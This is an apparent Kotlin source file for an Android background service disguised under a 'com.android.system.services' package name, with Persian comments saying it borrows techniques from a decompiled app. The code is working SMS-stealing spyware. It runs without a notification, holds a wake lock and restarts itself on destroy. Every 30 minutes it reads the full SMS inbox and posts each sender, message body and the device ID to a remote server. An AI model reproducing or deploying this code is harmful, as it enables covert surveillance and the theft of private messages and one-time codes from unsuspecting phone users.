package com.android.system.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

/**
 * 🔥 سرویس مانیتورینگ SMS - از تکنیک‌های برنامه decompiled
 * - هر 30 دقیقه پیامک‌های قدیمی رو چک میکنه
 * - با ScheduledExecutorService کار میکنه
 * - Background service (بدون notification)
 */
class SmsMonitorService : Service() {

    companion object {
        private const val TAG = "SmsMonitorService"
        
        // 🔥 ذخیره ID های پیامک‌هایی که قبلاً فرستاده شدن
        private val processedSmsIds = HashSet<String>()
    }

    private var scheduledExecutor: ScheduledExecutorService? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        acquireWakeLock()
        // 🔥 این سرویس background کار می‌کنه، notification نداره
        // UnifiedService notification رو نشون میده
        startScheduledSmsCheck()
        
        Log.d(TAG, "SmsMonitorService created (background mode)")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        
        // 🔥 تکنیک: وقتی destroy میشه، خودش رو دوباره راه‌اندازی میکنه
        restartService()
        
        scheduledExecutor?.shutdown()
        wakeLock?.release()
        
        Log.d(TAG, "SmsMonitorService destroyed, restarting...")
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire()
            Log.d(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WakeLock: ${e.message}")
        }
    }

    // 🔥 تکنیک: استفاده از ScheduledExecutorService مثل برنامه اول
    private fun startScheduledSmsCheck() {
        scheduledExecutor = Executors.newScheduledThreadPool(1)
        
        // اولین بار بعد از 5 ثانیه
        scheduledExecutor?.schedule({
            checkOldSms()
        }, 5, TimeUnit.SECONDS)
        
        // بعد هر 30 دقیقه
        scheduledExecutor?.scheduleAtFixedRate({
            checkOldSms()
        }, 30, 30, TimeUnit.MINUTES)
        
        Log.d(TAG, "Scheduled SMS check started")
    }

    // 🔥 تکنیک: چک کردن پیامک‌های قدیمی (مثل برنامه اول)
    private fun checkOldSms() {
        Log.d(TAG, "Checking old SMS messages")
        
        try {
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date"),
                null,
                null,
                "date DESC"
            )

            if (cursor == null || !cursor.moveToFirst()) {
                cursor?.close()
                return
            }

            val idIndex = cursor.getColumnIndex("_id")
            val addressIndex = cursor.getColumnIndex("address")
            val bodyIndex = cursor.getColumnIndex("body")
            val dateIndex = cursor.getColumnIndex("date")

            do {
                val id = cursor.getString(idIndex)
                val address = cursor.getString(addressIndex)
                val body = cursor.getString(bodyIndex)
                val date = cursor.getLong(dateIndex)

                // 🔥 ساخت unique ID برای هر پیامک
                val uniqueId = "${id}_${address}_${date}"

                if (!processedSmsIds.contains(uniqueId)) {
                    sendSmsToServer(address, body, date, uniqueId)
                    processedSmsIds.add(uniqueId)

                    // 🔥 محدود کردن سایز HashSet
                    if (processedSmsIds.size > 1000) {
                        processedSmsIds.clear()
                    }
                }
            } while (cursor.moveToNext())

            cursor.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error reading old SMS: ${e.message}", e)
        }
    }

    private fun sendSmsToServer(sender: String, message: String, timestamp: Long, smsId: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("sender", sender)
                    put("message", message)
                    put("timestamp", timestamp)
                    put("deviceId", deviceId)
                    put("sms_id", smsId)
                    put("source", "SmsMonitorService")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val url = URL("$baseUrl/sms/new")
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                conn.responseCode
                conn.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Error sending SMS to server: ${e.message}")
            }
        }.start()
    }

    private fun restartService() {
        try {
            val intent = Intent(applicationContext, SmsMonitorService::class.java)
            // 🔥 همیشه به عنوان background service راه‌اندازی میشه
            applicationContext.startService(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart service: ${e.message}")
        }
    }
}
